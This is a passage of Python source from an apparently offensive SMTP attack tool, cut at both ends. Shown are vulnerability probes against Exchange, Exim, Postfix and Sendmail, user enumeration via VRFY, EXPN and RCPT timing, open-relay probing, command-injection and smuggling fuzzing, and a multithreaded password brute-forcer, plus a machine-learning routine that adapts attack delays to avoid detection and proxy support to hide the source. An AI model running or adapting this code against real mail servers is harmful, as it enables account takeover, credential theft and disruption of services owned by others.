        "X-EXPS " + "C" * 12000 + "\r\n",
        "EHLO test.com\r\n" + ("A" * 1000 + "\r\n") * 5,
        "EHLO test.com\r\n" + "X" * 15000 + "\r\n"
    ]
    
    try:
        sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
        banner = _read_smtp_response(sock)
        
        if "Exchange" not in banner and "Microsoft" not in banner:
            sock.close()
            results['details'].append("Not a Microsoft Exchange server")
            return results
        
        for i, cmd in enumerate(fragmented_commands):
            try:
                start_time = time.time()
                sock.send(cmd.encode())
                response = _read_smtp_response(sock)
                response_time = time.time() - start_time
                
                if response_time > 5:
                    results['vulnerable'] = True
                    results['severity'] = 'Medium'
                    results['details'].append(f"Unusual response time ({response_time:.2f}s) for fragmented command")
                    results['exploit_commands'].append(cmd[:100])
                    print(f"[!!!] Exchange memory leak possible on {target}:{port}")
                    logging.warning(f"Exchange memory leak possible with fragmented command")
                
                if "memory" in response.lower() or "buffer" in response.lower():
                    results['vulnerable'] = True
                    results['severity'] = 'High'
                    results['details'].append(f"Memory-related error in response: {response[:100]}")
                    results['exploit_commands'].append(cmd[:100])
                    print(f"[!!!] Exchange memory leak detected on {target}:{port}")
                    logging.critical(f"Exchange memory leak detected")
                    break
                
                time.sleep(0.5)
                
            except Exception as e:
                logging.error(f"Error testing fragmented command: {e}")
        
        sock.close()
        
    except Exception as e:
        logging.error(f"Error checking Exchange memory leak: {e}")
        results['details'].append(f"Error during check: {str(e)}")
    
    return results


def check_2026_vulnerabilities(target: str, port: int = 25) -> Dict[str, Any]:
    """Comprehensive check for 2026 vulnerabilities"""
    results = {
        'smuggling_2': None,
        'exim_auth': None,
        'postfix_tls': None,
        'sendmail_traversal': None,
        'exchange_leak': None,
        'summary': {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0
        }
    }
    
    print("\n" + "="*70)
    print("[*] Starting 2026 Vulnerability Checks")
    print("="*70)
    
    results['smuggling_2'] = check_smtp_smuggling_2(target, port)
    results['exim_auth'] = check_exim_auth_cve(target, port)
    results['postfix_tls'] = check_postfix_starttls_downgrade(target, port)
    results['sendmail_traversal'] = check_sendmail_traversal(target, port)
    results['exchange_leak'] = check_exchange_memory_leak(target, port)
    
    for check in results.values():
        if isinstance(check, dict):
            if check.get('vulnerable', False):
                severity = check.get('severity', 'Low')
                if severity == 'Critical':
                    results['summary']['critical'] += 1
                elif severity == 'High':
                    results['summary']['high'] += 1
                elif severity == 'Medium':
                    results['summary']['medium'] += 1
                else:
                    results['summary']['low'] += 1
    
    print("\n[+] 2026 Vulnerability Scan Summary:")
    for severity, count in results['summary'].items():
        if count > 0:
            print(f"    {severity.upper()}: {count} vulnerabilities found")
    
    if sum(results['summary'].values()) == 0:
        print("    ✅ No 2026 vulnerabilities detected")
    
    return results


# ==================== EXISTING HELPER FUNCTIONS ====================
def get_random_ehlo_domain() -> str:
    """Returns a random EHLO domain for connection attempts."""
    return random.choice(EHLO_DOMAINS)

def create_raw_socket(target: str, port: int, timeout: int = DEFAULT_TIMEOUT) -> socket.socket:
    """Creates a raw socket, optionally via proxy."""
    s = None
    try:
        if SOCKS_AVAILABLE and PROXY_SETTINGS['host']:
            if PROXY_SETTINGS['type'] == 'socks5':
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                s.set_proxy(socks.SOCKS5, PROXY_SETTINGS['host'], PROXY_SETTINGS['port'])
            else:
                logging.warning(f"Proxy type {PROXY_SETTINGS['type']} not directly supported. Using direct connection.")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.settimeout(timeout)
        s.connect((target, port))
        return s
    except Exception as e:
        if s: s.close()
        raise e

def _read_smtp_response(sock: socket.socket, timeout: int = DEFAULT_TIMEOUT) -> str:
    """Reads a complete SMTP response from the socket."""
    sock.settimeout(timeout)
    response_buffer = b""
    start_time = time.time()
    try:
        while True:
            part = sock.recv(4096)
            if not part:
                logging.debug("Socket closed by peer during response read.")
                break
            response_buffer += part
            lines = response_buffer.split(b'\r\n')
            if len(lines) > 1 and len(lines[-2]) >= 3 and lines[-2][3:4] == b' ':
                if lines[-2][0:3].isdigit():
                    break
            if time.time() - start_time > timeout:
                logging.warning(f"Timeout while reading SMTP response. Buffer: {response_buffer.decode('utf-8', errors='ignore')}")
                break
    except socket.timeout:
        logging.debug(f"Socket timeout during response read.")
    except ConnectionResetError:
        logging.warning("Connection reset by peer during response read.")
    except Exception as e:
        logging.error(f"Unexpected error during SMTP response read: {e}")
    return response_buffer.decode('utf-8', errors='ignore').strip()


# ==================== EXISTING CORE FUNCTIONS ====================
def banner_grabbing(target: str, port: int = 25) -> Optional[str]:
    """Grabs SMTP banner from the target."""
    try:
        with create_raw_socket(target, port, DEFAULT_TIMEOUT) as sock:
            banner = _read_smtp_response(sock, timeout=DEFAULT_TIMEOUT)
            print(f"[+] Banner [{target}:{port}]: {banner}")
            logging.info(f"Banner [{target}:{port}]: {banner}")
            return banner
    except (socket.timeout, ConnectionRefusedError) as e:
        print(f"[-] Error during banner grabbing from {target}:{port}: {e}")
        logging.error(f"Error grabbing banner from {target}:{port}: {e}")
    except Exception as e:
        print(f"[-] Unexpected error grabbing banner from {target}:{port}: {e}")
        logging.error(f"Unexpected error grabbing banner from {target}:{port}: {e}")
    return None

def check_starttls(target: str, port: int = 25) -> Tuple[bool, List[str]]:
    """Checks for STARTTLS support and enumerates ESMTP extensions."""
    extensions = []
    try:
        with create_raw_socket(target, port, DEFAULT_TIMEOUT) as sock:
            banner_response = _read_smtp_response(sock)
            if not banner_response.startswith('220'):
                logging.warning(f"Unexpected banner response for STARTTLS check: {banner_response.strip()}")
            
            sock.send(f"EHLO {get_random_ehlo_domain()}\r\n".encode('utf-8'))
            response_raw = _read_smtp_response(sock)
            
            lines = response_raw.splitlines()
            for line in lines:
                if line.startswith("250-") or line.startswith("250 "):
                    ext = line[4:].strip().upper()
                    if ext:
                        extensions.append(ext)
            
            starttls_supported = "STARTTLS" in extensions
            print(f"[+] STARTTLS supported: {starttls_supported}")
            print(f"[+] Supported ESMTP Extensions: {', '.join(extensions) or 'None'}")
            logging.info(f"STARTTLS supported: {starttls_supported}, Extensions: {', '.join(extensions)}")
            return starttls_supported, extensions
    except Exception as e:
        print(f"[-] Error checking STARTTLS/EHLO extensions: {e}")
        logging.error(f"Error checking STARTTLS/EHLO extensions: {e}")
        return False, []

def connect_smtp(target: str, port: int, use_tls: bool = False, timeout: int = DEFAULT_TIMEOUT) -> Optional[smtplib.SMTP]:
    """Establishes an SMTP connection, supporting plain, STARTTLS, and SMTPS."""
    server_attempt = None
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    try:
        context.minimum_version = ssl.TLSVersion.TLSv1_3
    except AttributeError:
        logging.warning("TLSv1_3 not supported by current Python installation, falling back to highest available.")
    
    ehlo_domain = get_random_ehlo_domain()
    attempts = []
    
    if port == 465 or (use_tls and port in [25, 587]):
        try:
            print(f"[*] Attempting direct SMTPS (SMTP_SSL) on {target}:{port}...")
            if SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'socks5':
                s = create_raw_socket(target, port, timeout)
                server_attempt = smtplib.SMTP_SSL(target, port, timeout=timeout, context=context, _socket=s)
            else:
                server_attempt = smtplib.SMTP_SSL(target, port, timeout=timeout, context=context)
            
            server_attempt.ehlo(ehlo_domain)
            attempts.append(f"SMTPS success({port})")
            logging.info(f"Successfully connected via SMTPS to {target}:{port}")
            return server_attempt
        except smtplib.SMTPConnectError as e:
            attempts.append(f"SMTPS fail({port}:{e})")
            logging.debug(f"SMTPS connection failed to {target}:{port}: {e}")
        except Exception as e:
            attempts.append(f"SMTPS fail({port}:{e})")
            logging.debug(f"Unexpected error connecting via SMTPS: {e}")
    
    try:
        print(f"[*] Attempting plain SMTP on {target}:{port} with potential STARTTLS upgrade...")
        if SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'socks5':
            sock = create_raw_socket(target, port, timeout)
            server_attempt = smtplib.SMTP(target, port, timeout=timeout, _socket=sock)
        else:
            server_attempt = smtplib.SMTP(target, port, timeout=timeout)
        
        server_attempt.ehlo(ehlo_domain)
        ehlo_response = server_attempt.ehlo_resp.decode('utf-8', errors='ignore') if server_attempt.ehlo_resp else ""
        attempts.append(f"Plain SMTP EHLO ok ({ehlo_response.strip()[:50]})")
        
        if "STARTTLS" in ehlo_response.upper():
            if use_tls or port == 587:
                try:
                    print(f"[*] STARTTLS supported. Attempting to upgrade connection on {target}:{port}.")
                    server_attempt.starttls(context=context)
                    server_attempt.ehlo(ehlo_domain)
                    attempts.append("STARTTLS upgrade success")
                    logging.info(f"Successfully upgraded to STARTTLS on {target}:{port}")
                except smtplib.SMTPException as e:
                    attempts.append(f"STARTTLS upgrade fail: {e}")
                    print(f"[-] STARTTLS upgrade failed: {e}")
                    logging.warning(f"STARTTLS upgrade failed on {target}:{port}: {e}")
                    return None
            else:
                attempts.append("STARTTLS supported but not forced/ignored")
                logging.info(f"STARTTLS supported but not forced/ignored (port {port})")
        else:
            attempts.append("STARTTLS not supported")
            logging.info(f"STARTTLS not supported on {target}:{port}")
        
        return server_attempt
    
    except smtplib.SMTPConnectError as e:
        attempts.append(f"Plain SMTP connect fail: {e}")
        logging.debug(f"Plain SMTP connection failed to {target}:{port}: {e}")
    except smtplib.SMTPException as e:
        attempts.append(f"SMTP protocol error during connection: {e}")
        logging.debug(f"SMTP protocol error during connection to {target}:{port}: {e}")
    except (ConnectionRefusedError, socket.timeout) as e:
        attempts.append(f"Connection timeout/refused: {e}")
        logging.debug(f"Connection refused/timed out to {target}:{port}: {e}")
    except Exception as e:
        attempts.append(f"Fatal error during connection: {e}")
        logging.critical(f"Fatal error connecting to {target}:{port}: {e}")
    
    finally:
        if server_attempt:
            try:
                server_attempt.quit()
            except Exception as e:
                logging.debug(f"Error quiting SMTP session cleanly: {e}")
        logging.error(f"Failed to establish any SMTP connection. Attempts: {' | '.join(attempts)}")
        print(f"[-] Failed to establish any SMTP connection to {target}:{port}.")
    return None


# ==================== AI/ML Anomaly Detection ====================
if ML_AVAILABLE:
    def classify_response_anomaly(response_time: float, response_code: int) -> float:
        """Classifies response as anomalous using Isolation Forest."""
        global isolation_forest_model
        global response_data_for_ml
        response_data_for_ml.append([response_time, float(response_code)])
        if len(response_data_for_ml) < 20:
            logging.debug(f"Not enough data for Isolation Forest: {len(response_data_for_ml)}/{ISOLATION_FOREST_WINDOW_SIZE}")
            return 0.0
        data_array = np.array(list(response_data_for_ml))
        if isolation_forest_model is None or len(response_data_for_ml) == ISOLATION_FOREST_WINDOW_SIZE:
            try:
                isolation_forest_model = IsolationForest(
                    random_state=42,
                    contamination=IF_CONTAMINATION,
                    n_estimators=200, verbose=0, n_jobs=-1
                )
                isolation_forest_model.fit(data_array)
                logging.info("Isolation Forest model retrained successfully.")
            except ValueError as e:
                logging.error(f"Error training Isolation Forest: {e}")
                return 0.0
        try:
            score = isolation_forest_model.decision_function([[response_time, float(response_code)]])[0]
            return score
        except Exception as e:
            logging.error(f"Error classifying response anomaly: {e}")
            return 0.0
    
    def adjust_attack_delay(anomaly_score: float):
        """Dynamically adjusts attack delay based on anomaly score."""
        global current_attack_delay_min, current_attack_delay_max, current_burst_delay
        
        if anomaly_score < -0.3:
            current_attack_delay_min = min(current_attack_delay_min * 2, SLOW_ATTACK_DELAY_MAX_DEFAULT * 2)
            current_attack_delay_max = min(current_attack_delay_max * 2, SLOW_ATTACK_DELAY_MAX_DEFAULT * 2)
            current_burst_delay = min(current_burst_delay * 5, SLOW_ATTACK_DELAY_MAX_DEFAULT)
            print(f"[!] Critical AI Anomaly detected! Significant increase in delays to MIN:{current_attack_delay_min:.2f} MAX:{current_attack_delay_max:.2f} BURST:{current_burst_delay:.2f}")
            logging.critical(f"Critical AI Anomaly: Delays increased to {current_attack_delay_min:.2f}/{current_attack_delay_max:.2f}")
        elif anomaly_score < -0.1:
            current_attack_delay_min = min(current_attack_delay_min * 1.5, SLOW_ATTACK_DELAY_MAX_DEFAULT)
            current_attack_delay_max = min(current_attack_delay_max * 1.5, SLOW_ATTACK_DELAY_MAX_DEFAULT)
            current_burst_delay = min(current_burst_delay * 2, SLOW_ATTACK_DELAY_MAX_DEFAULT / 2)
            print(f"[!] Moderate AI Anomaly detected. Increasing delays to MIN:{current_attack_delay_min:.2f} MAX:{current_attack_delay_max:.2f}")
            logging.warning(f"Moderate AI Anomaly: Delays increased to {current_attack_delay_min:.2f}/{current_attack_delay_max:.2f}")
        elif anomaly_score > 0.3 and current_attack_delay_min > SLOW_ATTACK_DELAY_MIN_DEFAULT:
            current_attack_delay_min = max(current_attack_delay_min * 0.8, SLOW_ATTACK_DELAY_MIN_DEFAULT)
            current_attack_delay_max = max(current_attack_delay_max * 0.8, SLOW_ATTACK_DELAY_MIN_DEFAULT * 2)
            current_burst_delay = max(current_burst_delay * 0.5, BURST_ATTACK_DELAY_DEFAULT)
            logging.info(f"Normal AI behavior detected. Delays decreased to {current_attack_delay_min:.2f}/{current_attack_delay_max:.2f}")
        
        current_attack_delay_min = max(current_attack_delay_min, BURST_ATTACK_DELAY_DEFAULT / 2)
        current_attack_delay_max = max(current_attack_delay_max, current_attack_delay_min * 1.5)


# ==================== USER ENUMERATION FUNCTIONS ====================
def user_enumeration_vrfy(target: str, users: List[str], port: int = 25) -> List[str]:
    """User enumeration using VRFY, with adaptive delays."""
    valid_users = []
    print(f"\n[*] Starting VRFY enumeration for {target}:{port} with {len(users)} users...")
    server = None
    try:
        server = connect_smtp(target, port)
        if not server:
            print(f"[-] Could not connect for VRFY enumeration.")
            return valid_users
        
        for user in users:
            start_time = time.time()
            try:
                code, msg = server.vrfy(user)
                response_raw = f"{code} {msg.decode('utf-8', errors='ignore').strip()}"
                end_time = time.time()
                response_time = end_time - start_time
                response_code_prefix = code
                
                if code in [250, 252]:
                    print(f"[+] Valid user (VRFY): {user} (Response: {response_raw})")
                    logging.info(f"Valid user (VRFY): {user} (Response: {response_raw})")
                    valid_users.append(user)
                else:
                    print(f"[-] Invalid user (VRFY): {user} (Response: {response_raw})")
                    logging.debug(f"Invalid user (VRFY): {user} (Response: {response_raw})")
                
                if ML_AVAILABLE:
                    anomaly_score = classify_response_anomaly(response_time, response_code_prefix)
                    adjust_attack_delay(anomaly_score)
                time.sleep(random.uniform(current_attack_delay_min, current_attack_delay_max))
            except smtplib.SMTPServerDisconnected:
                print(f"[-] VRFY: Server disconnected for {user}. Reconnecting if possible.")
                logging.warning(f"VRFY: Server disconnected for {user}.")
                if ML_AVAILABLE: adjust_attack_delay(-0.5)
                server = connect_smtp(target, port)
                if not server: break
            except smtplib.SMTPException as e:
                print(f"[-] VRFY: SMTP error for {user}: {e}")
                logging.error(f"VRFY: SMTP error for {user}: {e}")
            except Exception as e:
                print(f"[-] VRFY: Unexpected error for {user}: {e}")
                logging.error(f"VRFY: Unexpected error for {user}: {e}")
                break
    except Exception as e:
        print(f"[-] Connection setup error for VRFY enumeration: {e}")
        logging.error(f"Connection setup error for VRFY enumeration: {e}")
    finally:
        if server: server.quit()
    return valid_users

def user_enumeration_expn(target: str, list_names: List[str], port: int = 25) -> Dict[str, str]:
    """User enumeration using EXPN with potential list names and adaptive delays."""
    expn_results = {}
    print(f"\n[*] Starting EXPN enumeration for {target}:{port} with {len(list_names)} lists...")
    server = None
    try:
        server = connect_smtp(target, port)
        if not server:
            print(f"[-] Could not connect for EXPN enumeration.")
            return expn_results
        
        for list_name in list_names:
            start_time = time.time()
            try:
                code, msg = server.expn(list_name)
                response_raw = f"{code} {msg.decode('utf-8', errors='ignore').strip()}"
                end_time = time.time()
                response_time = end_time - start_time
                response_code_prefix = code
                
                if code == 250:
                    print(f"[+] EXPN response for {list_name}: {response_raw}")
                    logging.info(f"EXPN response for {list_name}: {response_raw}")
                    expn_results[list_name] = response_raw
                else:
                    print(f"[-] EXPN response for {list_name} not successful: {response_raw}")
                    logging.debug(f"EXPN failed for {list_name}: {response_raw}")
                
                if ML_AVAILABLE:
                    anomaly_score = classify_response_anomaly(response_time, response_code_prefix)
                    adjust_attack_delay(anomaly_score)
                time.sleep(random.uniform(current_attack_delay_min, current_attack_delay_max))
            except smtplib.SMTPServerDisconnected:
                print(f"[-] EXPN: Server disconnected for {list_name}. Reconnecting if possible.")
                logging.warning(f"EXPN: Server disconnected for {list_name}.")
                if ML_AVAILABLE: adjust_attack_delay(-0.5)
                server = connect_smtp(target, port)
                if not server: break
            except smtplib.SMTPException as e:
                print(f"[-] EXPN: SMTP error for {list_name}: {e}")
                logging.error(f"EXPN: SMTP error for {list_name}: {e}")
            except Exception as e:
                print(f"[-] EXPN: Unexpected error for {list_name}: {e}")
                logging.error(f"EXPN: Unexpected error for {list_name}: {e}")
                break
    except Exception as e:
        print(f"[-] Connection setup error for EXPN enumeration: {e}")
        logging.error(f"Connection setup error for EXPN enumeration: {e}")
    finally:
        if server: server.quit()
    return expn_results

def user_enumeration_rcpt(target: str, users: List[str], domains: List[str], sender: str = "attacker@example.com", port: int = 25, attempts_per_user: int = 3) -> Tuple[List[str], Dict[str, List[float]]]:
    """Advanced User Enumeration using RCPT TO with robust timing analysis."""
    valid_users = set()
    all_timing_data: Dict[str, List[float]] = {'valid_likely': [], 'invalid_likely': [], 'anomalous': []}
    print(f"\n[*] Starting RCPT TO enumeration for {len(users)} users, {len(domains)} domains, {attempts_per_user} attempts each...")
    
    for domain in domains:
        print(f"[+] Testing RCPT TO against domain: {domain}")
        current_sender_email = f"attacker@{domain}"
        user_chunks = [users[i:i + 20] for i in range(0, len(users), 20)]
        
        for chunk_idx, user_chunk in enumerate(user_chunks):
            server = None
            try:
                server = connect_smtp(target, port)
                if not server:
                    print(f"[-] Could not establish connection for RCPT TO chunk {chunk_idx}. Skipping.")
                    continue
                
                try:
                    server.mail(current_sender_email)
                except smtplib.SMTPRecipientsRefused as e:
                    print(f"[-] MAIL FROM rejected with: {e.smtp_code} {e.smtp_error.decode()}. Cannot proceed.")
                    logging.warning(f"MAIL FROM rejected for {target}:{port}: {e}")
                    continue
                except smtplib.SMTPServerDisconnected:
                    print(f"[-] Server disconnected during MAIL FROM. Retrying chunk.")
                    logging.warning(f"Server disconnected during MAIL FROM for {target}:{port}.")
                    continue
                except smtplib.SMTPException as e:
                    print(f"[-] SMTP error during MAIL FROM: {e}. Skipping chunk.")
                    logging.error(f"SMTP error during MAIL FROM for {target}:{port}: {e}")
                    continue
                
                user_response_times_in_chunk = {}
                
                for user in user_chunk:
                    times_for_user = []
                    recipient_email = f"{user}@{domain}"
                    for attempt in range(attempts_per_user):
                        try:
                            start_time = time.time()
                            code, msg = server.rcpt(recipient_email)
                            response_raw = f"{code} {msg.decode('utf-8', errors='ignore').strip()}"
                            end_time = time.time()
                            response_time = end_time - start_time
                            
                            times_for_user.append(response_time)
                            response_code_prefix = code
                            
                            if code == 250:
                                all_timing_data['valid_likely'].append(response_time)
                                valid_users.add(recipient_email)
                                print(f"[+] Valid user (RCPT): {recipient_email} (Resp: {response_raw[:50]}, Time: {response_time:.4f}s)")
                                logging.info(f"Valid user (RCPT): {recipient_email} (Resp: {response_raw})")
                            elif code in [550, 551, 553]:
                                all_timing_data['invalid_likely'].append(response_time)
                                logging.debug(f"[-] Invalid user (RCPT): {recipient_email} (Resp: {response_raw[:50]}, Time: {response_time:.4f}s)")
                            else:
                                all_timing_data['anomalous'].append(response_time)
                                logging.info(f"[*] Anomalous RCPT response for {recipient_email}: {response_raw[:50]} (Time: {response_time:.4f}s)")
                            
                            if ML_AVAILABLE:
                                anomaly_score = classify_response_anomaly(response_time, response_code_prefix)
                                adjust_attack_delay(anomaly_score)
                            time.sleep(random.uniform(current_burst_delay, current_burst_delay * 2))
                            
                        except smtplib.SMTPServerDisconnected:
                            print(f"[-] RCPT TO: Server disconnected for {recipient_email}. Reconnecting.")
                            logging.warning(f"RCPT TO: Server disconnected for {recipient_email}.")
                            if ML_AVAILABLE: adjust_attack_delay(-0.5)
                            server = connect_smtp(target, port)
                            if not server: break
                        except smtplib.SMTPException as e:
                            print(f"[-] RCPT TO: SMTP exception for {recipient_email}: {e.smtp_code} {e.smtp_error.decode()}. Skipping.")
                            logging.error(f"RCPT TO: SMTP exception for {recipient_email}: {e}")
                            if ML_AVAILABLE: adjust_attack_delay(-0.3)
                            break
                        except Exception as e:
                            print(f"[-] RCPT TO: General error for {recipient_email}: {e}. Skipping.")
                            logging.error(f"RCPT TO: General error for {recipient_email}: {e}")
                            break
                    
                    if times_for_user:
                        user_response_times_in_chunk[recipient_email] = times_for_user
                
                if user_response_times_in_chunk and ML_AVAILABLE:
                    all_times_in_chunk = [t for times_list in user_response_times_in_chunk.values() for t in times_list]
                    if all_times_in_chunk and len(all_times_in_chunk) > 1:
                        median_time = statistics.median(all_times_in_chunk)
                        stdev_time = statistics.stdev(all_times_in_chunk)
                        
                        for user_full_email, times in user_response_times_in_chunk.items():
                            if not times: continue
                            avg_user_time = statistics.mean(times)
                            if abs(avg_user_time - median_time) > stdev_time * 2:
                                if user_full_email not in valid_users:
                                    print(f"[+] Possible valid user (timing anomaly): {user_full_email} (Avg Time: {avg_user_time:.4f}s, Median: {median_time:.4f}s, StDev: {stdev_time:.4f}s)")
                                    logging.info(f"Possible valid user (timing anomaly): {user_full_email}")
                                    valid_users.add(user_full_email)
                                    all_timing_data['anomalous'].append(avg_user_time)
                
            except Exception as e:
                print(f"[-] General error in RCPT TO chunk processing: {e}")
                logging.error(f"General error in RCPT TO chunk processing: {e}")
            finally:
                if server:
                    try: server.quit()
                    except: pass
                time.sleep(random.uniform(current_attack_delay_min, current_attack_delay_max))
    
    return list(valid_users), all_timing_data


# ==================== OPEN RELAY & FUZZING ====================
def check_open_relay_aggressive(target: str, probe_from_emails: List[str], probe_to_emails: List[str], port: int = 25) -> bool:
    """Checks for Open Relay more aggressively."""
    print(f"\n[*] Starting aggressive Open Relay check on {target}:{port}...")
    probe_from_emails_expanded = list(set(probe_from_emails + [f"user@{d}" for d in INTERNAL_DOMAINS]))
    found_open_relay = False
    for from_email in probe_from_emails_expanded:
        for to_email in probe_to_emails:
            if found_open_relay: break
            server = None
            try:
                server = connect_smtp(target, port)
                if not server:
                    logging.warning(f"Could not connect for open relay check: {from_email} -> {to_email}")
                    continue
                try:
                    server.mail(from_email)
                    server.rcpt(to_email)
                    print(f"[!!!] Open Relay detected! Accepted {from_email} -> {to_email}")
                    logging.critical(f"Open Relay detected: {from_email} -> {to_email}")
                    found_open_relay = True
                    break
                except smtplib.SMTPRecipientsRefused as e:
                    logging.debug(f"Open Relay check rejected for {from_email} -> {to_email}: {e.smtp_code} {e.smtp_error.decode()}")
                except smtplib.SMTPException as e:
                    logging.warning(f"SMTP error during open relay check ({from_email} -> {to_email}): {e}")
                except Exception as e:
                    logging.error(f"General error during open relay check ({from_email} -> {to_email}): {e}")
            finally:
                if server:
                    try: server.quit()
                    except: pass
                time.sleep(random.uniform(current_burst_delay, current_burst_delay * 3))
    return found_open_relay

def test_smtp_injection_fuzzing(target: str, port: int = 25) -> List[Dict[str, str]]:
    """Tests for SMTP Command Injection/Smuggling."""
    results = []
    print(f"\n[*] Starting SMTP Command Injection and Fuzzing tests on {target}:{port}...")
    
    smtp_commands = [
        ("HELO", "test.com"), ("EHLO", "test.com"),
        ("MAIL FROM:", "<test@example.com>"),
        ("RCPT TO:", "<test@example.com>"),
        ("DATA", ""),
        ("AUTH PLAIN", "VXNlcjExOkxvbGxhYnllMTIz"),
        ("RSET", ""), ("QUIT", "")
    ]
    
    total_tests = len(smtp_commands) * sum(len(v) for v in FUZZING_PAYLOADS.values())
    test_count = 0
    
    for cmd, default_arg in smtp_commands:
        for p_type, payloads in FUZZING_PAYLOADS.items():
            for payload_bytes in payloads:
                test_count += 1
                payload_str = payload_bytes.decode('latin-1', errors='ignore')
                full_command_bytes = None
                log_display_cmd = ""
                
                if cmd == "DATA":
                    full_command_bytes = b"HELO " + get_random_ehlo_domain().encode() + b"\r\n" \
                                       + b"MAIL FROM:<test@attacker.com>\r\n" \
                                       + b"RCPT TO:<test@victim.com>\r\n" \
                                       + b"DATA\r\n" \
                                       + b"Subject: Fuzz Test\r\n" \
                                       + b"\r\n" \
                                       + b"This is a fuzzed message body.\r\n" \
                                       + payload_bytes + b"\r\n" \
                                       + b".\r\n"
                    log_display_cmd = "SMUGGLE(DATA)"
                elif cmd == "AUTH PLAIN":
                    full_command_bytes = b"AUTH PLAIN " + payload_bytes + b"\r\n"
                    log_display_cmd = f"AUTH PLAIN(FUZZ)"
                else:
                    full_command_bytes = f"{cmd} {default_arg}{payload_str}\r\n".encode('latin-1', errors='ignore')
                    log_display_cmd = f"{cmd}(FUZZ)"
                
                if full_command_bytes is None: continue
                
                sock = None
                try:
                    sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
                    banner_raw = _read_smtp_response(sock)
                    if not banner_raw.startswith('220'):
                        logging.warning(f"Unexpected banner response for fuzzing: {banner_raw.strip()}")
                    
                    sock.sendall(full_command_bytes)
                    response_raw = _read_smtp_response(sock)
                    
                    response_code = response_raw.split(' ')[0] if response_raw and response_raw.split(' ')[0].isdigit() else "000"
                    
                    if response_code in ["250", "354"] and (p_type != "smuggling_data" or log_display_cmd != "SMUGGLE(DATA)"):
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'AcceptedMalformed', 'command': cmd})
                        print(f"[!!!] Accepted Malformed: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.warning(f"Accepted Malformed: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                    elif response_code.startswith("5") and not response_code in ["500", "501", "503", "504"]:
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'UnexpectedError', 'command': cmd})
                        print(f"[!!!] Unexpected Error: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.warning(f"Unexpected Error: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                    elif "debug" in response_raw.lower() or "stack trace" in response_raw.lower():
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'DebugInfoLeak', 'command': cmd})
                        print(f"[!!!] Debug Info Leak: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.critical(f"Debug Info Leak: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                    elif log_display_cmd == "SMUGGLE(DATA)" and ("250" in response_raw or "221" in response_raw):
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'SMTP_Smuggling', 'command': cmd})
                        print(f"[!!!] SMTP Smuggling Likely: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.critical(f"SMTP Smuggling Likely: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                
                except smtplib.SMTPServerDisconnected:
                    results.append({'payload': payload_str, 'response': 'Disconnected', 'type': 'ServerDisconnected', 'command': cmd})
                    print(f"[!!!] Server Disconnected during Fuzzing: Cmd='{cmd}' Payload='{payload_str}'")
                    logging.critical(f"Server Disconnected: {cmd}, Payload:{payload_str}")
                except socket.timeout:
                    results.append({'payload': payload_str, 'response': 'Timeout', 'type': 'Timeout', 'command': cmd})
                    print(f"[!!!] Fuzzing Timeout: Cmd='{cmd}' Payload='{payload_str}'")
                    logging.warning(f"Fuzzing Timeout: {cmd}, Payload:{payload_str}")
                except Exception as e:
                    results.append({'payload': payload_str, 'response': str(e), 'type': 'PythonError', 'command': cmd})
                    logging.error(f"Error during fuzzing {log_display_cmd} with '{payload_str}': {e}")
                time.sleep(random.uniform(current_burst_delay / 2, current_burst_delay))
                
                sys.stdout.write(f"\rTesting Fuzzing: {test_count}/{total_tests} completed. Found {len(results)} anomalies.")
                sys.stdout.flush()
            
            sys.stdout.write("\n")
    
    print(f"\n[*] Fuzzing completed. Found {len(results)} potential anomalies.")
    return results


# ==================== BRUTE FORCE ====================
def brute_force_aggressive(target: str, port: int, users: List[str], passwords: List[str], use_tls: bool = False, max_workers: int = 5) -> Tuple[List[Tuple[str, str]], Dict[str, List[float]]]:
    """Aggressive brute force supporting multiple AUTH methods and concurrency."""
    successful_logins = []
    account_lockouts = {}
    shared_lock = threading.Lock()
    timing_data: Dict[str, List[float]] = {'success': [], 'fail': [], 'auth_error': []}
    
    print(f"\n[*] Starting aggressive brute force on {target}:{port} with {len(users)} users, {len(passwords)} passwords, {max_workers} concurrent workers.")
    
    def _attempt_login(user: str, password: str):
        if user in account_lockouts and (time.time() - account_lockouts[user]) < 300:
            logging.info(f"Skipping {user}: Temporarily locked out.")
            return None
        
        server = None
        start_time = time.time()
        response_code_prefix = 0
        try:
            server = connect_smtp(target, port, use_tls)
            if not server:
                with shared_lock:
                    timing_data['fail'].append(time.time() - start_time)
                return None
            try:
                server.login(user, password)
                end_time = time.time()
                with shared_lock:
                    print(f"[+] Successful login: {user}:{password}")
                    logging.critical(f"Successful login: {user}:{password}")
                    successful_logins.append((user, password))
                    timing_data['success'].append(end_time - start_time)
                response_code_prefix = 235
            except smtplib.SMTPAuthenticationError as e:
                end_time = time.time()
                response_raw = str(e)
                response_code_prefix = int(response_raw.split(' ')[0]) if response_raw.split(' ')[0].isdigit() else 535
                with shared_lock:
                    print(f"[-] Failed login: {user}:{password} ({e.smtp_code} {e.smtp_error.decode('utf-8').strip()})")
                    logging.info(f"Failed login: {user}:{password} ({e.smtp_code} {e.smtp_error.decode('utf-8').strip()})")
                    timing_data['auth_error'].append(end_time - start_time)
                    if response_code_prefix in [535, 550, 554]:
